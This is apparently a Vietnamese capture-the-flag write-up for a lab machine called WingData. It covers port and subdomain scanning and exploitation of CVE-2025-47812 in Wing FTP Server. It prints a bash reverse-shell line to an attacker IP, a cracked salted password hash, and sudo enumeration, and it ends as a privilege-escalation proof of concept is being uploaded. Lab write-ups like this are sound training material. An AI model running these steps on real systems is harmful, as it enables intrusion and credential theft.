# WingData

<img width="1448" height="800" alt="image" src="https://github.com/user-attachments/assets/9ad83e6c-cecb-4f42-9c49-3f486b638c37" />

IP target là `10.129.1.247`, đầu tiên dùng nmap để scan các port đang mở:

```
# Nmap 7.98 scan initiated Wed Mar  4 21:21:11 2026 as: nmap -Pn -sV -p- -sC --min-rate=200 -T 4 -oN nmap_hehe -v 10.129.7.105
Nmap scan report for 10.129.7.105
Host is up (0.060s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  4 21:23:09 2026 -- 1 IP address (1 host up) scanned in 117.72 seconds
```

Target này có 2 port đang mở là 22 và 80, trong đó 80 đang chạy dịch vụ web với domain là `wingdata.htb`, website này không có gì để khai thác nhiều

<img width="1903" height="1029" alt="image" src="https://github.com/user-attachments/assets/3238e3f0-f1bc-4b6e-bc04-2a859e7d3798" />

Tiếp tục đi scan các subdomain bằng lệnh 

```
ffuf -w ~/wordlist/subdomains-top1mil-20000.txt -u http://wingdata.htb/ -H "Host: FUZZ.wingdata.htb" | grep -v "Words: 21, Lines: 10"
```

Tìm được subdomain là ftp:

<img width="1318" height="536" alt="image" src="https://github.com/user-attachments/assets/8191bf3e-b782-48b9-935e-3f6bdeabf83c" />

Và có thể thấy được phiên bản của dịch vụ này là `Wing FTP Server v7.4.3`

<img width="1909" height="1023" alt="image" src="https://github.com/user-attachments/assets/a14c953e-b7d6-4f8f-a40d-e45bec9818f2" />

Search google tìm poc thì xuất hiện [CVE-2025-47812](https://www.exploit-db.com/exploits/52347), vuln này có dẫn đến RCE:

<img width="1528" height="946" alt="image" src="https://github.com/user-attachments/assets/042845c5-5ee3-41aa-8147-174f6b740116" />

Tạo reverse shell:

```
bash -c 'bash -i >& /dev/tcp/10.10.14.143/1234 0>&1'
```

Encode url lại và chạy script:

<img width="1424" height="979" alt="image" src="https://github.com/user-attachments/assets/1760d967-a13b-4bc5-92b4-5e51296048dc" />

<img width="778" height="239" alt="image" src="https://github.com/user-attachments/assets/5f161361-2b17-416d-a5f8-69aaf669d5c4" />

Tiếp theo là tìm các thông tin nhạy cảm của user "wacky" sau khi phát hiện user có tồn tại trên hệ thống:

<img width="1098" height="972" alt="image" src="https://github.com/user-attachments/assets/dd26b1b0-8372-451f-8c52-f53474e48e99" />

Do hash của password này có salt nên phải tìm thêm cả salt nữa, nếu để ý trong file `/opt/wftpserver/Data/1/settings.xml` thì sẽ thấy salt của nó là `WingFTP`:

<img width="722" height="933" alt="image" src="https://github.com/user-attachments/assets/6bb4c00a-e2a7-47b8-b6d0-e1f34a1e38d0" />

Tiếp theo là dùng hashcat để crack password:

```
hashcat -m 1410 ~/hashcat/target.txt ~/wordlist/rockyou.txt --show
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

Dùng password đó thì truy cập thành công vào user wacky:

<img width="1111" height="474" alt="image" src="https://github.com/user-attachments/assets/533cbbeb-bec0-4e4e-b28b-9c01709ad987" />

Dùng `sudo -l` thì thấy có file `/opt/backup_clients/restore_backup_clients.py` được chạy dưới quyền root, kiểm tra phiên bản python3 thì là Python 3.12.3:

<img width="655" height="168" alt="image" src="https://github.com/user-attachments/assets/02323d25-1414-4bb1-9c0b-9887173f7d23" />

Kết hợp các dữ kiện này thì tìm được poc của 2 cve là [CVE-2025-4138-4517](https://github.com/DesertDemons/CVE-2025-4138-4517-POC), upload script lên target:


















